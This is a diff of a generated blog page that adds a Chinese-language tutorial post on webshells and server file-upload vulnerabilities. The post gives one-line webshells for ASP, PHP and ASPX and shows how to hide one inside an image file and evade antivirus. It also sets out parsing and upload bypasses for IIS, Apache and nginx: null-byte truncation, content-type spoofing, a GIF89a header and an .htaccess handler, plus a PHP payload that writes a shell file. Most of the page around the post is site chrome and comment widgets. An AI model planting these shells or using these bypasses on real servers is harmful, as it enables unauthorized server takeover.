@@ -6,14 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2018/3 | welcome to here</title>
+  <title>木马制作及服务器上传漏洞 | welcome to here</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="welcome to here">
-<meta property="og:url" content="http://yoursite.com/archives/2018/03/index.html">
+  <meta name="description" content="整理一下有关上传漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="木马制作及服务器上传漏洞">
+<meta property="og:url" content="http://yoursite.com/2018/01/07/木马制作及服务器上传漏洞/index.html">
 <meta property="og:site_name" content="welcome to here">
+<meta property="og:description" content="整理一下有关上传漏洞">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/0069oIoUgy1fn7y46zs3gj30dw0dwdg4.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/0069oIoUgy1fn7yaeqlsxj306505a3yb.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/0069oIoUgy1fn80wd8fi9j30dw0dwq4p.jpg">
+<meta property="og:updated_time" content="2018-03-06T11:52:09.239Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="welcome to here">
+<meta name="twitter:title" content="木马制作及服务器上传漏洞">
+<meta name="twitter:description" content="整理一下有关上传漏洞">
+<meta name="twitter:image" content="http://ww4.sinaimg.cn/large/0069oIoUgy1fn7y46zs3gj30dw0dwdg4.jpg">
   
     <link rel="alternative" href="/atom.xml" title="welcome to here" type="application/atom+xml">
   
@@ -143,76 +151,236 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-木马制作及服务器上传漏洞" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/08/hello-world/" class="archive-article-date">
-  	<time datetime="2018-03-08T08:22:21.378Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-08</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/08/hello-world/">Hello World</a>
+    <h1 class="article-title" itemprop="name">
+      木马制作及服务器上传漏洞
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/06/渗透测试流程-1/" class="archive-article-date">
-  	<time datetime="2018-03-06T12:59:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-06</time>
+        
+        <a href="/2018/01/07/木马制作及服务器上传漏洞/" class="archive-article-date">
+  	<time datetime="2018-01-07T04:37:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-07</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/06/渗透测试流程-1/">渗透测试流程</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>整理一下有关上传漏洞<br><a id="more"></a><br>主要讲一下通过一句话木马来对服务器上传漏洞进行攻击。</p>
+<h2 id="一句木马好处介绍"><a href="#一句木马好处介绍" class="headerlink" title="一句木马好处介绍"></a>一句木马好处介绍</h2><p>  短小精悍，隐蔽性好，为之后上传大马来对服务器提权做准备。</p>
+<p>  <img src="http://ww4.sinaimg.cn/large/0069oIoUgy1fn7y46zs3gj30dw0dwdg4.jpg" alt="image"></p>
+<h2 id="一句话木马的常见写法"><a href="#一句话木马的常见写法" class="headerlink" title="一句话木马的常见写法"></a>一句话木马的常见写法</h2><p>   asp一句话木马<br>   &lt;% eval request(“kobe”)%&gt;<br>   php一句话木马<br>   &lt;?php @eval($_post[kobe]);?&gt;<br>   aspx一句话木马<br>   &lt;% @Page Language=”Jscript”%&gt;<br>   &lt;% eval(Request.Item[“value”])%&gt;<br>   还有很多就不一一列了<br>   <img src="http://ww1.sinaimg.cn/large/0069oIoUgy1fn7yaeqlsxj306505a3yb.jpg" alt="image"></p>
+<h2 id="制作木马过程"><a href="#制作木马过程" class="headerlink" title="制作木马过程"></a>制作木马过程</h2><p>   1.通过01编辑器打开图片，在图片的末尾写入木马语句。</p>
+<p>   2.在中断使用命令来写  copy /b 1.jpg+1.asp 2.jpg</p>
+<p>   3.使用文件包含在asp脚本中写入<!-- #include file="1.jpg" -->来包含1.jpg文件防止被查杀</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="解析漏洞（指服务器在对文件或者文件路径解析时，在某种情况下将文件解释成脚本文件格式的漏洞）"><a href="#解析漏洞（指服务器在对文件或者文件路径解析时，在某种情况下将文件解释成脚本文件格式的漏洞）" class="headerlink" title="解析漏洞（指服务器在对文件或者文件路径解析时，在某种情况下将文件解释成脚本文件格式的漏洞）"></a>解析漏洞（指服务器在对文件或者文件路径解析时，在某种情况下将文件解释成脚本文件格式的漏洞）</h2><p>   1.IIS5.0/6下的解析漏洞<br>      1.建立文件名为xx.asp的文件夹，文件夹中的文件会被当成asp脚本来执行<br>      2.将文件名命名为xx.asp;.jpg,分号后面的内容会不进行解析，文件被服务器会当成xx.asp文件</p>
+<p>   2.apache解析漏洞<br>      1.apache对于文件名的解析方式是通过对于文件名先从右到左解析，若没有发现能解析的文件名在从左<br>      到右解析(那就可以构造如1.php.xxx这样的文件名来绕过)<br>      2.如果在apache镇南关.htaccess可执行且可被上传，那么尝试在.htaccess文件中写入<filematch "she="" ll.jpg"=""> SetHandder application/x-httpd-php </filematch></p>
+<p>   3.IIS7.0/7.5畸形解析漏洞<br>     在默认Fast-CGI开启状态下，黑阔上传一个名为yt.jpg,文件里面的内容为&lt;?php fputs(fopen(‘shell..ph<br>     p’,’w’),”&lt;?php eval($_post[yt])?&gt;”);?&gt;然后再网页上访问yt.jpg/.php<br>     在这个目录下就会生成含有一句话木马的shell.php文件</p>
+<p>   4.nginx在8.03版本下空字节代码执行漏洞<br>      上传一个含有一句话木马的图片，用bp来抓包，将原来的1.jpg文件改为xxx.php%00.jpg,通过00截断来使得<br>      文件名变为xxx.php.服务器就会来执行这个脚本文件。</p>
+<h2 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h2><p>   服务器上文件命名规则：<br>        1.上传文件名和服务器命名一致<br>        2.上传文件名和服务器命名不一致</p>
+<p>   1.文件头欺骗的漏洞<br>      在一句话木马文件头前面加入GIF89a，然后将木马保存为图片的格式，可以绕过简单的waf</p>
+<p>   2.filepath漏洞（基于IIS5/6）<br>      具体方法参照上文的解析漏洞</p>
+<p>   3.00截断发<br>       主要通过bp抓包来实现，可以结合上文的解析漏洞来看</p>
+<p>   4.filetype漏洞<br>      上传文件时通过修改文件类型，来触发漏洞。<br>      例如上传的是一张图片，抓包的content-type的类型为 image/jpge，下面是具体图片的内容<br>      那么可以通过修改content-type的类型改为，text/php，然后下面的内容就改为所上传的一句话木马。</p>
+<p>   5.双文件上传漏洞<br>      第一个上传正常的文件，第二个上传含有木马的文件</p>
+<p>   漏洞都比较老，还是要在继续学习呀<br>   <img src="http://ww4.sinaimg.cn/large/0069oIoUgy1fn80wd8fi9j30dw0dwq4p.jpg" alt="image"></p>
 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢请我吃糖<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/01/07/木马制作及服务器上传漏洞/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2018/01/08/上传漏洞fckeditor的利用/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          上传漏洞fckeditor的利用
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="/2018/01/04/跳一跳基于python下的高分/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">跳一跳基于python下的高分</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一句木马好处介绍"><span class="toc-number">1.</span> <span class="toc-text">一句木马好处介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一句话木马的常见写法"><span class="toc-number">2.</span> <span class="toc-text">一句话木马的常见写法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#制作木马过程"><span class="toc-number">3.</span> <span class="toc-text">制作木马过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number"></span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#解析漏洞（指服务器在对文件或者文件路径解析时，在某种情况下将文件解释成脚本文件格式的漏洞）"><span class="toc-number">1.</span> <span class="toc-text">解析漏洞（指服务器在对文件或者文件路径解析时，在某种情况下将文件解释成脚本文件格式的漏洞）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#上传漏洞"><span class="toc-number">2.</span> <span class="toc-text">上传漏洞</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
+        </div>
+        
+    </div>
+</aside>
+
+
+
+  
+  <div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="木马制作及服务器上传漏洞" data-title="木马制作及服务器上传漏洞" data-url="http://yoursite.com/2018/01/07/木马制作及服务器上传漏洞/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"true"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+  
+  
+  
+  <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+<script>
+  var cloudTieConfig = {
+    url: "http://yoursite.com/2018/01/07/木马制作及服务器上传漏洞/", 
+    sourceId: "木马制作及服务器上传漏洞",
+    productKey: "true",
+    target: "cloud-tie-wrapper"
+  };
+</script>
+<script src="//img1.cache.netease.com/f2e/tie/yun/sdk/loader.js"></script>
   
 
-    
+  
+  <div id="SOHUCS" sid="木马制作及服务器上传漏洞" ></div> 
+<script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
+<script type="text/javascript">
+    window.changyan.api.config({
+        appid: "true",
+        conf: "true"
+    });
+</script>
+</script>
+  
+
+  
+
+  
 
 
           </div>
@@ -235,8 +403,8 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
